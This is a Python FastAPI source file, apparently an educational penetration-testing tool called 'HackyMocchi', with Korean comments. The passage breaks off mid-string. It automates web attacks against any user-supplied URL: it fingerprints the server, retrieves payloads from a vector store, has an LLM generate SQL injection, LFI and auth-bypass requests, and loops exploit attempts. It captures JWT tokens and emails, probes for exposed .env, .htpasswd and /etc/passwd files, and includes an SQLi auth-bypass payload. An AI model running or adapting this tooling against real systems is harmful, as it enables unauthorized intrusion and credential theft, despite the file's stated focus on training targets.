import os
import sys
import asyncio
import json
import socket
import re
import requests
import urllib3
from typing import AsyncGenerator, List, Optional
from urllib.parse import urlparse

from fastapi import FastAPI
from fastapi.responses import FileResponse, StreamingResponse
from pydantic import BaseModel

# ── Vector Only Imports (BM25/Reranker 제거) ───────────────────────
from langchain_chroma import Chroma
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_core.documents import Document
from groq import Groq

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI(title="HackyMocchi API - Vector Only Edition")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "hackymocchi", "chroma_data")
COLLECTION_KNOWLEDGE = "vuln_knowledge"
COLLECTION_PAYLOADS = "hacking_payloads"

TOP_K = 10  # 검색 결과 수 (eval 기준 최고 성능)


# ── [Class] Security Search Engine (Vector Only) ───────────────────
class SecuritySearchEngine:
    def __init__(self, db_path):
        print("\n[*] Initializing Vector-Only Security Engine...")

        print("    1. Loading Embeddings (MiniLM-L6)...")
        self.embeddings = HuggingFaceEmbeddings(
            model_name="sentence-transformers/all-MiniLM-L6-v2"
        )

        print("    2. Connecting to Vector DB...")
        self.vs_payloads = Chroma(
            collection_name=COLLECTION_PAYLOADS,
            persist_directory=db_path,
            embedding_function=self.embeddings,
        )
        self.vs_vuln = Chroma(
            collection_name=COLLECTION_KNOWLEDGE,
            persist_directory=db_path,
            embedding_function=self.embeddings,
        )

        print("    3. Connecting Groq LLM...")
        self.client = Groq(api_key=os.environ.get("GROQ_API_KEY"))
        self.model_name = "llama-3.1-8b-instant"

        print("[+] Engine Ready! (Vector Only + Groq)\n")

    def _dedup(self, docs: List[Document], limit: int) -> List[Document]:
        seen, result = set(), []
        for doc in docs:
            if doc.page_content not in seen:
                seen.add(doc.page_content)
                result.append(doc)
                if len(result) >= limit:
                    break
        return result

    def search(self, user_query: str, tech: str, top_n: int = 5) -> str:
        # 1. Groq로 쿼리 최적화
        optimized_query = self._optimize_query(user_query, tech)

        # 2. Vector Only 다중 쿼리 검색 (eval F1=0.6128, 1위)
        #    api.py 방식: 공격 유형별 멀티 쿼리 → 구조화된 context
        knowledge_queries = [
            f"SQL injection {tech} web application vulnerability",
            f"web authentication bypass {tech}",
            f"XSS cross-site scripting {tech}",
        ]
        payload_queries = [
            optimized_query,
            "SQL injection authentication bypass login payload",
            f"web exploit {tech} HTTP request payload",
            "XSS payload input injection",
            "LFI path traversal web exploit",
        ]

        seen: set = set()
        vuln_docs, pay_docs = [], []

        try:
            for q in knowledge_queries:
                for doc in self.vs_vuln.similarity_search(q, k=1):
                    if doc.page_content not in seen:
                        seen.add(doc.page_content)
                        vuln_docs.append(doc)

            for q in payload_queries:
                for doc in self.vs_payloads.similarity_search(q, k=1):
                    if doc.page_content not in seen:
                        seen.add(doc.page_content)
                        pay_docs.append(doc)
        except Exception as e:
            print(f"    [!] Vector Search Error: {e}")
            return _web_fallback_context(tech)

        if not vuln_docs and not pay_docs:
            return _web_fallback_context(tech)

        # 3. 구조화된 context (api.py 스타일)
        context_lines = []
        if pay_docs:
            context_lines.append("[Payload Examples from DB]")
            for doc in pay_docs[:4]:
                context_lines.append(f"- {doc.page_content.strip()[:200]}")
        if vuln_docs:
            context_lines.append("[Vulnerability Knowledge]")
            for doc in vuln_docs[:2]:
                context_lines.append(f"- {doc.page_content.strip()[:200]}")

        return "\n".join(context_lines)

    def _optimize_query(self, query: str, tech: str) -> str:
        prompt = (
            f"You are a security expert. Convert this to a precise CVE/Exploit DB search query.\n"
            f"Tech Stack: {tech}\n"
            f"Attack Goal: {query}\n"
            f"Focus on: attack type, vulnerability class, and relevant keywords.\n"
            f"Output ONLY English search keywords (max 6 words). "
            f"Example: 'Node.js Express SQLi auth bypass payload'"
        )
        try:
            res = self.client.chat.completions.create(
                messages=[{"role": "user", "content": prompt}],
                model=self.model_name,
                temperature=0.1,
                max_tokens=60,
            )
            return res.choices[0].message.content.strip()
        except Exception:
            return f"{tech} {query} exploit payload"


# 전역 엔진 변수
search_engine = None


class AnalyzeRequest(BaseModel):
    target_url: str
    session_cookie: Optional[str] = None
    custom_headers: Optional[dict] = None
    username: Optional[str] = None
    password: Optional[str] = None


@app.on_event("startup")
async def startup_event():
    global search_engine
    if os.path.exists(DB_PATH):
        search_engine = SecuritySearchEngine(DB_PATH)
    else:
        print(f"[!] DB Path not found at {DB_PATH}")


@app.get("/")
async def index():
    return FileResponse(os.path.join(BASE_DIR, "index.html"))


@app.post("/api/analyze")
async def analyze(req: AnalyzeRequest):
    return StreamingResponse(
        run_pipeline(req.target_url, req.session_cookie, req.custom_headers, req.username, req.password),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


def emit(event_type: str, data: dict) -> str:
    return f"event: {event_type}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"


# ── Pipeline Logic ────────────────────────────────────────────────
async def run_pipeline(target_url: str, session_cookie: str = None, custom_headers: dict = None,
                       username: str = None, password: str = None) -> AsyncGenerator[str, None]:
    has_login = bool(username and password)
    off = 1 if has_login else 0  # step index offset when login step is prepended
    steps = (["login"] if has_login else []) + ["recon", "retrieve", "generate", "exploit", "report"]
    yield emit("pipeline_init", {"steps": steps})

    state = {
        "target_url": target_url, "target_ip": "Unknown",
        "detected_tech": "Web Vulnerability", "server": "Unknown",
        "context": "", "final_payload": target_url,
        "is_success": False, "attempts": 0, "last_feedback": "None",
        "http_method": "GET", "post_data": {}, "_doc_count": 0,
        "_explanation": "", "_status_code": None, "_indicators_found": [],
        "_session_cookie": session_cookie or "",
        "_custom_headers": custom_headers or {},
    }

    # Step 0 (optional): Auto Login
    if has_login:
        yield emit("step_update", {"index": 0, "status": "running"})
        try:
            login_result = await asyncio.to_thread(_auto_login, target_url, username, password)
            if login_result["success"] and login_result["cookie"]:
                state["_session_cookie"] = login_result["cookie"]
        except Exception as e:
            login_result = {"success": False, "cookie": "", "message": f"로그인 오류: {str(e)[:100]}"}
        yield emit("stage", {"stage": "login_result", "data": login_result})
        yield emit("step_update", {"index": 0, "status": "complete"})

    # Step off+0: Recon
    yield emit("step_update", {"index": off + 0, "status": "running"})
    try:
        result = await asyncio.to_thread(_recon, state)
        state.update(result)
    except Exception as e:
        state["last_feedback"] = str(e)
    yield emit("stage", {"stage": "recon_result", "data": {
        "ip": state["target_ip"], "server": state["server"], "tech": state["detected_tech"]
    }})
    yield emit("step_update", {"index": off + 0, "status": "complete"})

    # Step off+1: Retrieve (Vector Only)
    yield emit("step_update", {"index": off + 1, "status": "running"})
    try:
        if search_engine:
            context_text = await asyncio.to_thread(
                search_engine.search,
                user_query="authentication bypass RCE injection payloads",
                tech=state["detected_tech"],
                top_n=5,
            )
            state["context"] = context_text
            state["_doc_count"] = 5 if context_text else 0
        else:
            state["context"] = _web_fallback_context(state["detected_tech"])
            state["_doc_count"] = 0
    except Exception as e:
        state["context"] = f"Error: {e}. " + _web_fallback_context(state["detected_tech"])

    yield emit("stage", {"stage": "retrieve_result", "data": {
        "doc_count": state["_doc_count"], "context_length": len(state["context"])
    }})
    yield emit("step_update", {"index": off + 1, "status": "complete"})

    # Steps off+2 and off+3: Generate -> Exploit Loop (Rule-Based Primary, 12 attack types)
    MAX_ATTEMPTS = 12
    while not state["is_success"] and state["attempts"] < MAX_ATTEMPTS:
        attempt_num = state["attempts"] + 1

        # Step off+2: Generate — Rule-Based Primary Strategy
        yield emit("step_update", {"index": off + 2, "status": "running"})
        rb = _rule_based_payload(state, attempt_num)
        state.update({
            "final_payload": rb["url"],
            "http_method": rb["method"],
            "post_data": rb["data"],
            "_explanation": rb["explanation"],
            "_content_type": rb.get("content_type", "json"),
        })

        yield emit("stage", {"stage": "generate_result", "data": {
            "url": state["final_payload"], "method": state["http_method"],
            "post_data": state["post_data"], "explanation": state["_explanation"],
            "attempt": attempt_num,
        }})
        yield emit("step_update", {"index": off + 2, "status": "complete"})

        # Step off+3: Exploit
        yield emit("step_update", {"index": off + 3, "status": "running"})
        try:
            result = await asyncio.to_thread(_exploit, state)
            state.update(result)
        except Exception as e:
            state["is_success"] = False
            state["attempts"] += 1
            state["last_feedback"] = str(e)

        yield emit("stage", {"stage": "exploit_result", "data": {
            "is_success": state["is_success"], "attempt": state["attempts"],
            "feedback": state["last_feedback"], "status_code": state.get("_status_code"),
            "indicators_found": state.get("_indicators_found", []),
            "jwt_token": state.get("_jwt_token"),
            "captured_email": state.get("_captured_email"),
            "captured_role": state.get("_captured_role"),
            "attack_url": state.get("_attack_url", ""),
            "attack_method": state.get("_attack_method", ""),
            "attack_data": state.get("_attack_data", {}),
            "response_preview": state.get("_response_preview", ""),
            "target_url": target_url,
        }})
        yield emit("step_update", {"index": off + 3, "status": "complete"})

        if state["is_success"]:
            break

    # Step off+4: Report
    yield emit("step_update", {"index": off + 4, "status": "running"})
    report_text = _build_report(state)
    yield emit("stage", {"stage": "report_result", "data": {"report": report_text}})
    yield emit("step_update", {"index": off + 4, "status": "complete"})

    yield emit("done", {
        "is_success": state["is_success"], "attempts": state["attempts"],
        "target_url": target_url, "ip": state["target_ip"], "tech": state["detected_tech"],
    })


# ── Helper Functions ──────────────────────────────────────────────
def _auto_login(target_url: str, username: str, password: str) -> dict:
    """플랫폼별 자동 로그인 — 성공 시 세션 쿠키 문자열 반환."""
    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    def _extract_hidden_fields(html: str) -> dict:
        """HTML form의 hidden input 필드 전부 추출."""
        fields = {}
        for m in re.finditer(
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']',
            html, re.IGNORECASE
        ):
            fields[m.group(1)] = m.group(2)
        # 속성 순서 반대인 경우도 처리
        for m in re.finditer(
            r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']*)["\']',
            html, re.IGNORECASE
        ):
            if m.group(1) not in fields:
                fields[m.group(1)] = m.group(2)
        return fields

    def _cookie_string(s: requests.Session) -> str:
        return "; ".join(f"{k}={v}" for k, v in s.cookies.items())

    # ── HackThisSite ────────────────────────────────────────────────
    if "hackthissite" in base.lower():
        try:
            login_url = f"{base}/user/login"
            page = session.get(login_url, timeout=10, verify=False)
            hidden = _extract_hidden_fields(page.text)
            post_data = {
                "username": username,
                "password": password,
                "btn_submit": "Login",
                **hidden,  # form_token, creation_time, sid 등 hidden 필드 포함
            }
            resp = session.post(
                login_url, data=post_data,
                headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
                timeout=10, verify=False, allow_redirects=True,
            )
            cookie_str = _cookie_string(session)
            # 로그인 성공 판정: 응답에 아이디 포함 or logout 링크 or 쿠키 획득
            success = (
                username.lower() in resp.text.lower()
                or "logout" in resp.text.lower()
                or "log out" in resp.text.lower()
                or bool(cookie_str)
            )
            # 실패 판정 override: 에러 메시지 있으면 실패
            if any(msg in resp.text.lower() for msg in ["incorrect password", "invalid username", "login error", "authentication failed"]):
                success = False
            if success:
                return {"success": True, "cookie": cookie_str,
                        "message": f"로그인 성공 ✅ 쿠키 획득: {cookie_str[:100]}"}
            else:
                return {"success": False, "cookie": "", "message": "로그인 실패 ❌ 아이디/비밀번호를 확인하세요"}
        except Exception as e:
            return {"success": False, "cookie": "", "message": f"로그인 오류: {str(e)[:120]}"}

    # ── WordPress ───────────────────────────────────────────────────
    if "wp-login" in base.lower() or "wordpress" in base.lower():
        try:
            login_url = f"{base}/wp-login.php"
            page = session.get(login_url, timeout=10, verify=False)
            hidden = _extract_hidden_fields(page.text)
            post_data = {
                "log": username, "pwd": password,
                "wp-submit": "Log In", "redirect_to": f"{base}/wp-admin/",
                "testcookie": "1", **hidden,
            }
            session.cookies.set("wordpress_test_cookie", "WP+Cookie+check")
            resp = session.post(
                login_url, data=post_data,
                headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
                timeout=10, verify=False, allow_redirects=True,
            )
            cookie_str = _cookie_string(session)
            success = "wp-admin" in resp.url or any("wordpress_logged_in" in k for k in session.cookies.keys())
            if success:
                return {"success": True, "cookie": cookie_str,
                        "message": f"WordPress 로그인 성공 ✅ 쿠키: {cookie_str[:100]}"}
            else:
                return {"success": False, "cookie": "", "message": "WordPress 로그인 실패 ❌"}
        except Exception as e:
            return {"success": False, "cookie": "", "message": f"로그인 오류: {str(e)[:120]}"}

    # ── Generic Form Login ──────────────────────────────────────────
    for login_path in ["/login", "/user/login", "/auth/login", "/signin", "/account/login"]:
        try:
            login_url = f"{base}{login_path}"
            page = session.get(login_url, timeout=8, verify=False)
            if page.status_code != 200:
                continue
            hidden = _extract_hidden_fields(page.text)
            post_data = {"username": username, "password": password, "email": username, **hidden}
            resp = session.post(
                login_url, data=post_data,
                headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
                timeout=10, verify=False, allow_redirects=True,
            )
            cookie_str = _cookie_string(session)
            success = (
                resp.status_code == 200
                and ("logout" in resp.text.lower() or username.lower() in resp.text.lower())
                and bool(cookie_str)
            )
            if success:
                return {"success": True, "cookie": cookie_str,
                        "message": f"로그인 성공 ✅ ({login_path}) 쿠키: {cookie_str[:100]}"}
        except Exception:
            continue

    return {"success": False, "cookie": "", "message": "자동 로그인 지원 안됨 — 수동으로 쿠키를 입력하세요"}


def _recon(state: dict) -> dict:
    url = state["target_url"]
    user_cookie = state.get("_session_cookie", "")
    user_headers = dict(state.get("_custom_headers", {}))
    try:
        domain = urlparse(url).netloc.split(":")[0]
        ip = socket.gethostbyname(domain)
        req_headers = {}
        if user_cookie:
            req_headers["Cookie"] = user_cookie
        req_headers.update(user_headers)
        res = requests.get(url, timeout=5, verify=False, headers=req_headers if req_headers else None)
        server = res.headers.get("Server", "Unknown")
        x_powered = res.headers.get("X-Powered-By", "")
        body_snippet = res.text[:2000].lower()
        tech = "General Web App"
        if "Apache" in server:
            tech = "Apache"
        elif "Nginx" in server:
            tech = "Nginx"
        elif "Express" in server or "Express" in x_powered:
            tech = "Node.js/Express"
        elif "IIS" in server:
            tech = "IIS"
        elif "Python" in server or "Werkzeug" in server:
            tech = "Python Web App"
        elif "HackThisSite" in server or "hackthissite" in server.lower():
            tech = "HackThisSite (PHP/Custom)"
        # Heroku 뒤에 숨은 앱 추가 감지 (응답 바디/헤더 기반)
        elif "Heroku" in server or "heroku" in server.lower():
            if "juice" in body_snippet or "owasp" in body_snippet:
                tech = "Node.js/Express (Juice Shop)"
            else:
                tech = "Node.js/Express"
        # 바디 기반 추가 감지 (서버 헤더가 모호할 때)
        if tech == "General Web App":
            if "juice shop" in body_snippet or "owasp" in body_snippet:
                tech = "Node.js/Express (Juice Shop)"
            elif "wordpress" in body_snippet or "wp-content" in body_snippet:
                tech = "WordPress"
            elif "hackthissite" in body_snippet or "hack this site" in body_snippet:
                tech = "HackThisSite (PHP/Custom)"
        return {"target_ip": ip, "detected_tech": tech, "server": server, "attempts": 0}
    except Exception as e:
        return {
            "target_ip": "Unknown",
            "detected_tech": "Web Vulnerability",
            "server": f"Error: {str(e)[:60]}",
            "attempts": 0,
        }


def _generate(state: dict) -> dict:
    client = Groq(api_key=os.environ.get("GROQ_API_KEY"))
    prompt = f"""You are a web penetration tester. Reply ONLY with one JSON object, no extra text.

Target: {state['target_url']}
Tech stack: {state['detected_tech']}
Previous attempt feedback: {state['last_feedback']}

Web attack types to consider: SQLi, XSS, LFI, IDOR, Command Injection, Auth Bypass
Common web endpoints: /login, /rest/user/login, /api/login, /search, /admin, /register

Payloads & hints from knowledge base:
{state['context'][:2000]}

Rules:
1. Use the Context payloads above if relevant.
2. If last attempt got 403/WAF, try URL encoding or a different technique.
3. If last attempt got 404, try a different endpoint path.
4. Prioritize SQLi auth bypass for login endpoints.

Output JSON ONLY:
{{"url":"full_url_with_path","method":"POST","data":{{"email":"payload","password":"x"}},"explanation":"attack type and reason"}}"""
    try:
        res = client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama-3.1-8b-instant",
            temperature=0.6,
        )
        json_str = res.choices[0].message.content
        match = re.search(r"\{.*\}", json_str, re.DOTALL)
        if not match:
            raise ValueError("No JSON")
        data = json.loads(match.group())
        # LLM이 상대경로 URL을 반환하는 경우 base URL을 붙여서 절대경로로 교정
        raw_url = data.get("url", state["target_url"])
        if raw_url.startswith("/"):
            parsed = urlparse(state["target_url"])
            base = f"{parsed.scheme}://{parsed.netloc}"
            raw_url = base + raw_url
        return {
            "final_payload": raw_url,
            "http_method": data.get("method", "GET"),
            "post_data": data.get("data", {}),
            "_explanation": data.get("explanation", ""),
        }
    except Exception as e:
        raise e


def _exploit(state: dict) -> dict:
    payload = state["final_payload"]
    method = state.get("http_method", "GET")
    post_data = state.get("post_data", {})
    req_content_type = state.get("_content_type", "json")  # "json" or "form" (요청 타입)

    # 로그인 엔드포인트 판별 (POST /login 계열)
    is_login_endpoint = method == "POST" and any(
        kw in payload.lower() for kw in ["/login", "/signin", "/auth", "/user/login"]
    )

    # 비-로그인용 성공 지표 (HTML 페이지에서도 유효한 것들)
    generic_indicators = [
        "root:x:0:0:", "uid=", "SQL syntax", "You have an error in your SQL",
        "acquisitions", "PackageType",
    ]
    # 로그인 성공 지표 (JSON 응답에서만 유효 — HTML 오탐 방지)
    login_indicators = [
        "admin@juice-sh.op", "authentication", "role",
    ]
    # CTF 미션 페이지 성공 지표 (HackThisSite Basic Missions 등)
    # 주의: 이 단어들이 일반 HTML 페이지에도 등장할 수 있으므로 file_exposure_check와 분리 운영
    ctf_indicators = [
        # Mission 1: hidden input (solution 또는 pass 필드)
        'type="hidden" name="pass"', "type='hidden' name='pass'",
        'name="pass" type="hidden"', "name='pass' type='hidden'",
        'type="hidden" name="solution"', 'name="solution" type="hidden"',
        # Mission 2: JS 평문 비밀번호
        "var pass =", "var password =", "var solution =",
        "if (pass ==", "if (password ==",
        # Mission 3: 서버사이드 password 파일
        "The password to this level",
        # 디렉토리 리스팅
        "Index of /", "Directory listing",
        # /etc/passwd 실제 노출
        "root:x:0:0:",
        # 미션 완료 지표
        "Congratulations", "You have passed",
    ]

    # robots.txt 정찰 성공 지표 (민감한 경로가 포함된 경우만)
    robots_sensitive = ["/admin", "/private", "/backup", "/secret", "/config", "/db", "/database"]

    # 파일 직접 노출 판별 함수 (HTML 에러 페이지 false positive 방지)
    def _is_real_file_exposed(response_text: str, file_type: str, sc: int) -> bool:
        """파일이 실제로 열렸는지 확인 (404 HTML 페이지와 구분)."""
        if sc != 200:
            return False
        text_lower = response_text.lower()
        # HTML 에러 페이지 판별 — 실제 파일이면 <!doctype html>로 시작하지 않음
        is_html = text_lower.strip().startswith("<!doctype") or text_lower.strip().startswith("<html")
        if is_html:
            return False
        if file_type == "htpasswd":
            # 실제 .htpasswd: username:$apr1$... 또는 username:{SHA}...
            return bool(re.search(r'\w+:\$apr1\$|\w+:\{SHA\}|\w+:\$2[aby]\$', response_text))
        if file_type == "env":
            # 실제 .env: KEY=VALUE 패턴이 여러 줄
            return len(re.findall(r'^[A-Z_]+=.+', response_text, re.MULTILINE)) >= 2
        if file_type == "bak":
            # 백업 파일: PHP 태그나 소스코드
            return "<?php" in response_text or "<?=" in response_text
        # 기타 파일: HTML 아니고 200이면 성공
        return not is_html

    # PHP/form 기반 성공 지표 (리다이렉트 후 로그인 성공)
    form_login_success = ["dashboard", "welcome", "logout", "profile", "my account"]

    # 사용자 제공 세션 쿠키 / 커스텀 헤더
    user_cookie = state.get("_session_cookie", "")
    user_headers = dict(state.get("_custom_headers", {}))

    try:
        session = requests.Session()

        # 세션 쿠키 주입 (사용자가 제공한 경우)
        if user_cookie:
            session.headers.update({"Cookie": user_cookie})
        # 커스텀 헤더 주입
        if user_headers:
            session.headers.update(user_headers)

        # ── CSRF 토큰 추출 (form 기반 POST 전에 실행) ──────────────────
        csrf_token = None
        if method == "POST" and req_content_type == "form":
            try:
                login_page = session.get(payload, timeout=5, verify=False)
                # csrfmiddlewaretoken (Django), _token (Laravel), csrf (generic)
                for pattern in [
                    r'name=["\']csrfmiddlewaretoken["\'][^>]+value=["\']([^"\']+)["\']',
                    r'value=["\']([^"\']+)["\'][^>]+name=["\']csrfmiddlewaretoken["\']',
                    r'name=["\']_token["\'][^>]+value=["\']([^"\']+)["\']',
                    r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']',
                    r'name=["\']csrf["\'][^>]+value=["\']([^"\']+)["\']',
                    r'<input[^>]+name=["\']form_token["\'][^>]+value=["\']([^"\']+)["\']',
                ]:
                    csrf_match = re.search(pattern, login_page.text, re.IGNORECASE)
                    if csrf_match:
                        csrf_token = csrf_match.group(1)
                        break
                if csrf_token:
                    post_data = dict(post_data)
                    post_data["form_token"] = csrf_token  # phpBB/HackThisSite uses form_token
                    print(f"    [CSRF] Token extracted: {csrf_token[:20]}...")
            except Exception as csrf_err:
                print(f"    [CSRF] Could not extract token: {csrf_err}")

        if method == "POST":
            if req_content_type == "form":
                res = session.post(
                    payload, data=post_data,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": payload,
                    },
                    timeout=8, verify=False, allow_redirects=True,
                )
            else:
                res = session.post(
                    payload, json=post_data,
                    headers={"Content-Type": "application/json"},
                    timeout=8, verify=False,
                )
        else:
            res = session.get(payload, timeout=8, verify=False)

        status_code = res.status_code
        content_type = res.headers.get("Content-Type", "")
        is_json = "application/json" in content_type
        response_preview = res.text[:400]

        # ── JWT 토큰 추출 (is_success 판단 전에 먼저 실행) ──────────────
        jwt_token = None
        captured_email = None
        captured_role = None

        # 1차: JSON 구조 파싱 (Juice Shop / 일반 API 형식)
        try:
            resp_json = res.json()
            auth = resp_json.get("authentication", {})
            jwt_token = auth.get("token") or resp_json.get("token")
            captured_email = auth.get("umail") or resp_json.get("email")
            if isinstance(resp_json.get("data"), dict):
                data_obj = resp_json["data"]
                jwt_token = jwt_token or data_obj.get("token")
                captured_email = captured_email or data_obj.get("email")
                captured_role = data_obj.get("role")
        except Exception:
            pass

        # 2차: JWT 정규식 — eyJ 시작 3-파트 base64 토큰 직접 추출
        if not jwt_token:
            jwt_match = re.search(
                r'eyJ[A-Za-z0-9+/=_-]{10,}\.[A-Za-z0-9+/=_-]{10,}\.[A-Za-z0-9+/=_-]{10,}',
                res.text
            )
            if jwt_match:
                jwt_token = jwt_match.group()

        # ── 성공 판정 ───────────────────────────────────────────────────
        if is_login_endpoint:
            if req_content_type == "form":
                # form 기반 로그인: 리다이렉트 후 대시보드/프로필 키워드 OR 세션 쿠키
                has_session = bool(session.cookies.get("phpbb3_") or
                                   session.cookies.get("PHPSESSID") or
                                   any("session" in k.lower() for k in session.cookies.keys()))
                page_text_lower = res.text.lower()
                is_success = bool(jwt_token) or has_session or any(
                    ind.lower() in page_text_lower for ind in form_login_success
                )
            else:
                # JSON 로그인: JWT 토큰 추출됐을 때만 진짜 성공
                # (HTML 페이지의 "password", "token" 단어 오탐 방지)
                is_success = bool(jwt_token) or (
                    is_json and any(ind.lower() in res.text.lower() for ind in login_indicators)
                )
        else:
            # 비-로그인 공격: 일반 지표 사용 (LFI, SQLi error, IDOR, CTF 미션 등)
            is_success = any(ind.lower() in res.text.lower() for ind in generic_indicators + login_indicators + ctf_indicators)
            # robots.txt: 민감한 경로가 Disallow로 노출될 때만 성공
            if not is_success and "robots.txt" in payload and status_code == 200:
                is_success = any(sensitive in res.text for sensitive in robots_sensitive)
            # 파일 직접 노출 공격: 실제 파일 내용인지 검증 (HTML 에러 페이지 false positive 방지)
            if not is_success:
                if ".htpasswd" in payload:
                    is_success = _is_real_file_exposed(res.text, "htpasswd", status_code)
                elif ".env" in payload and "envoy" not in payload:
                    is_success = _is_real_file_exposed(res.text, "env", status_code)
                elif ".bak" in payload or ".backup" in payload:
                    is_success = _is_real_file_exposed(res.text, "bak", status_code)

        # ── CTF 미션 페이지 직접 추출 (HackThisSite Basic Missions) ──────
        ctf_extracted = []
        if "/missions/" in payload and status_code == 200:
            # 1) 모든 hidden input 추출 (name + value)
            hidden_patterns = [
                r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']+)["\']',
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']+)["\']',
                r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']([^"\']{2,})["\'][^>]+type=["\']hidden["\']',
            ]
            skip_names = {"csrf", "_token", "csrfmiddlewaretoken", "form_token", "level", "stage", "mission"}
            for pat in hidden_patterns:
                for m in re.finditer(pat, res.text, re.IGNORECASE):
                    name, value = m.group(1), m.group(2)
                    if name.lower() not in skip_names and value.strip():
                        ctf_extracted.append(f"[HIDDEN INPUT] name={name} value={value}")
            # 2) JS 평문 비밀번호 변수 추출
            js_patterns = [
                r'var\s+(pass|password|passwd|solution|answer|key|secret)\s*=\s*["\']([^"\']+)["\']',
                r'(?:pass|password|passwd|solution|answer)\s*==\s*["\']([^"\']+)["\']',
                r'(?:pass|password|passwd|solution|answer)\s*===\s*["\']([^"\']+)["\']',
            ]
            for pat in js_patterns:
                for m in re.finditer(pat, res.text, re.IGNORECASE):
                    groups = m.groups()
                    if len(groups) == 2:
                        ctf_extracted.append(f"[JS VAR] {groups[0]}='{groups[1]}'")
                    else:
                        ctf_extracted.append(f"[JS COMPARE] value='{groups[0]}'")
            # 3) 미션 페이지 로그인 여부 확인 (로그인 안된 경우 login 리다이렉트)
            if not ctf_extracted:
                lower_text = res.text.lower()
                if "login" in lower_text and "mission" not in lower_text:
                    ctf_extracted.append("[SESSION] 미션 페이지 접근 실패 - 세션 쿠키를 확인하세요")
                elif "mission" in lower_text or "level" in lower_text:
                    ctf_extracted.append("[SESSION OK] 미션 페이지 로드됨 - 숨겨진 필드 없음 (Ctrl+U로 직접 확인)")
            if ctf_extracted:
                is_success = any("[HIDDEN INPUT]" in e or "[JS VAR]" in e or "[JS COMPARE]" in e for e in ctf_extracted)

        all_indicators = generic_indicators + login_indicators + ctf_indicators + robots_sensitive
        found = [ind for ind in all_indicators if ind.lower() in res.text.lower()] if is_success else []
        found = ctf_extracted + found  # CTF 추출 결과를 맨 앞에 표시
        if jwt_token and "token" not in found:
            found.insert(0, "JWT token captured")

        if is_success:
            if jwt_token:             feedback = "Success! JWT token captured."
            elif ctf_extracted and any("[HIDDEN INPUT]" in e or "[JS VAR]" in e for e in ctf_extracted):
                                      feedback = f"CTF Mission SUCCESS! 비밀번호 발견: {ctf_extracted[0]}"
            else:                     feedback = "Success indicators found!"
        elif status_code == 403:     feedback = "WAF blocked. Try encoding."
        elif status_code == 404:     feedback = "Endpoint not found."
        elif status_code == 500:     feedback = "Server error - possible vulnerability!"
        elif status_code == 401:     feedback = "Authentication required."
        elif status_code == 200:     feedback = "Request successful but no exploit indicators found."
        else:                        feedback = f"Status {status_code}. No exploit indicators."

        return {
            "is_success": is_success,
            "attempts": state["attempts"] + 1,
            "last_feedback": feedback,
            "_status_code": status_code,
            "_indicators_found": found,
            "_jwt_token": jwt_token,
            "_captured_email": captured_email,
            "_captured_role": captured_role,
            "_response_preview": response_preview,
            "_attack_url": payload,
            "_attack_method": method,
            "_attack_data": post_data,
        }
    except Exception as e:
        return {
            "is_success": False,
            "attempts": state["attempts"] + 1,
            "last_feedback": f"Connection error: {str(e)[:80]}",
            "_status_code": None,
            "_indicators_found": [],
            "_jwt_token": None,
            "_captured_email": None,
            "_captured_role": None,
            "_response_preview": "",
            "_attack_url": payload,
            "_attack_method": method,
            "_attack_data": post_data,
        }


def _build_report(state: dict) -> str:
    status = "공격 성공 ✅" if state["is_success"] else "공격 실패 ❌"
    indicators = ", ".join(state.get("_indicators_found", [])) or "없음"
    post_data_str = json.dumps(state.get("post_data", {}), ensure_ascii=False) or "없음"

    return f"""## 테스트 결과 보고서

### 1. 테스트 개요
- **대상 URL**: {state['target_url']}
- **대상 IP**: {state['target_ip']}
- **서버**: {state['server']}
- **감지된 기술 스택**: {state['detected_tech']}
- **최종 결과**: {status}
- **총 시도 횟수**: {state['attempts']}회

### 2. 사용된 공격 기법
- **공격 타입**: SQL Injection / Web Vulnerability
- **HTTP 메소드**: {state.get('http_method', 'GET')}
- **최종 페이로드 URL**: `{state['final_payload']}`
- **POST 데이터**: `{post_data_str}`
- **발견된 성공 지표**: {indicators}

### 3. 결과 분석
{
    '취약점 발견: 입력값이 SQL 쿼리에 직접 삽입되는 SQL Injection 취약점이 존재합니다. 공격자가 인증 없이 관리자 권한을 탈취할 수 있습니다.'
    if state['is_success'] else
    '취약점 미발견: 현재 설정으로는 공격이 성공하지 않았습니다. 더 정교한 페이로드가 필요하거나 대상이 방어 기법을 적용하고 있을 수 있습니다.'
}

### 4. 권장 조치사항
1. **Prepared Statements** (매개변수화된 쿼리) 사용
2. **입력값 검증** 및 화이트리스트 기반 필터링
3. **WAF(Web Application Firewall)** 도입
4. **에러 메시지 숨김** - SQL 에러를 사용자에게 노출하지 않기
5. **최소 권한 원칙** - DB 계정에 최소한의 권한만 부여

---
*이 테스트는 교육용 취약 애플리케이션(OWASP Juice Shop 등)을 대상으로 수행되었습니다.*
*반드시 **허가된 시스템**에서만 테스트를 수행하십시오.*"""


def _web_fallback_context(tech: str) -> str:
    return (
        "[Web Hacking Fallback Payloads]\n"
        "- SQL Injection (SQLite/Juice Shop): email=' OR true--, password=x\n"
